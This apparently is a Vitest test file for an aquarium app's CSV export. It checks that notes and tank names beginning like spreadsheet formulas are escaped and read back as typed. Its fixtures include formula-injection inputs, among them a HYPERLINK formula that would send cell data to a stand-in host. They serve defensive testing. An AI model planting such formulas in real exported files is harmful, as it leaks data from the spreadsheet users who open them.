import { mkdtempSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { eq } from 'drizzle-orm';
import { describe, expect, it, vi } from 'vitest';

// water-tests.csv is opened in spreadsheets (#221): a note or a name that
// starts like a formula mustn't run there, and must come back as typed on import.
const dir = mkdtempSync(join(tmpdir(), 'wl-export-csv-'));
vi.mock('$env/dynamic/private', () => ({ env: { DATA_DIR: dir } }));
const { db } = await import('./db');
const { exports } = await import('./db/schema');
const { upsertUser } = await import('./users');
const { createTank, listParams } = await import('./tanks');
const { createTest } = await import('./logs');
const { startExport } = await import('./export');
const { historyContext } = await import('./import');
const { readHistory } = await import('./import-history');

const user = upsertUser({ email: 'keeper@example.com', name: 'Keeper', googleSub: 'g-keeper' });
const tank = createTank(user, { name: '=Reef, 40', type: 'freshwater', nominalVolumeL: 150 });
const ph = listParams(tank.id).find((p) => p.key === 'ph')!;
const NOTES = ['=HYPERLINK("http://example/?"&A1,"x")', '+1 fish today', '@home', 'cleaned\rthe filter', '-2 snails', 'nothing odd'];
NOTES.forEach((note, i) => createTest(user.id, tank.id, { takenAt: new Date(Date.UTC(2026, 9, 1 + i, 9)).toISOString(), note, readings: new Map([[ph.id, 7 + i / 10]]) }, { timeZone: 'UTC' }));

async function csv() {
	const { id } = startExport(user, 'account', null, 'csv');
	for (let i = 0; i < 200; i++) {
		const row = db.select().from(exports).where(eq(exports.id, id)).get()!;
		if (row.status === 'ready') return readFileSync(row.filePath!, 'utf8');
		if (row.status === 'failed') throw new Error(row.error ?? 'failed');
		await new Promise((r) => setTimeout(r, 25));
	}
	throw new Error('the export never finished');
}

describe('water-tests.csv (#221)', () => {
	it('writes no cell a spreadsheet would run, and reads back as it was typed', async () => {
		const text = await csv();
		// every cell that starts like a formula carries the apostrophe; numbers don't
		const cells = text.trim().split('\n').slice(1).flatMap((line) => line.split(/,(?=(?:[^"]*"[^"]*")*[^"]*$)/));
		for (const c of cells) expect(/^"?[=+@\t\r]/.test(c), c).toBe(false);
		expect(text).toContain(`"'=HYPERLINK(""http://example/?""&A1,""x"")"`);
		expect(text).toContain("'+1 fish today");
		expect(text).toContain("\"'=Reef, 40\"");
		// a bare return is inside quotes, so it can't split the row
		expect(text).toContain('"cleaned\rthe filter"');
		expect(text).toContain(',-2 snails');

		const read = readHistory('tests', text, historyContext(user, tank));
		if ('error' in read) throw new Error(read.error);
		// (a return inside a note is a line break to the importer, however it was written)
		const flat = (s: string | null) => (s ?? '').replace(/[\r\n]/g, '');
		expect(read.rows.map((r) => flat((r.value as { note: string | null }).note))).toEqual(NOTES.map(flat));
		// the tank's own name, guarded in the file, is still recognised as this tank
		expect(read.rows.every((r) => r.other === null)).toBe(true);
	});
});
